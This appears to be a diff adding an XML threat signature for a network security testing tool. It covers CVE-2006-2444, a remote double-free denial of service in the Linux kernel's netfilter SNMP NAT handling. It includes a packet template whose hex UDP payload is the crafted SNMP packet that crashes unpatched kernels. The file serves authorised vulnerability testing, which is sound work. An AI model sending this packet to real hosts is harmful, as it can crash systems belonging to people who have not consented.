@@ -1,0 +1,87 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Linux Kernel SNMP NAT Netfilter Memory Corruption"/>
+    <EngDesc display="true" value="There exists a remote denial of service vulnerability in the Linux Kernel. The vulnerability occurs due to insufficient checks during the processing of SNMP packets by the netfilter module. By sending a crafted SNMP packet to a target host, an attacker may exploit this vulnerability to cause a double free error in the Linux Kernel; thus, creating a system wide denial of service condition."/>
+    <Intent display="true">
+      <item value="MEMORY_CORRUPTION"/>
+    </Intent>
+    <Protocol display="true" value="SNMP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Linux_Kernel_Project"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Linux_Kernel_Project_Linux_Kernel_Project_Kernel"/>
+      <item value="Linux_Kernel_Project_Linux_Kernel_Project_Ubuntu_Linux"/>
+      <item value="Linux_Kernel_Project_Linux_Kernel_Project_Linux"/>
+      <item value="Linux_Kernel_Project_Linux_Kernel_Project_Mandrake_Linux"/>
+      <item value="Linux_Kernel_Project_Linux_Kernel_Project_Mandriva_Linux"/>
+      <item value="Linux_Kernel_Project_Linux_Kernel_Project_SUSE_LINUX"/>
+      <item value="Linux_Kernel_Project_Linux_Kernel_Project_Enterprise_Linux"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Linux_Kernel_Project_Kernel_2.6.16.17_and_earlier"/>
+      <item value="Linux_Kernel_Project_Ubuntu_Linux_"/>
+      <item value="Linux_Kernel_Project_Linux_"/>
+      <item value="Linux_Kernel_Project_Mandrake_Linux_"/>
+      <item value="Linux_Kernel_Project_Mandriva_Linux_"/>
+      <item value="Linux_Kernel_Project_SUSE_LINUX_"/>
+      <item value="Linux_Kernel_Project_Enterprise_Linux_"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20060523-07"/>
+    <CVEID display="true" value="CVE-2006-2444"/>
+    <bugtraqID display="true" value="18081"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="536bd786a4cd11dd8a61000c29da7492"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="not-required"/>
+    <IntegImpact display="false" value="not-required"/>
+    <AvailImpact display="false" value="Complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633601787247500000"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1225145728" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="SNMPdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="" Identification="7335" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="@random(1026,65535)" destPort="$SNMPdestPort" checksum="" length="" Payload="300F02010104067075626C6963A4026161"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
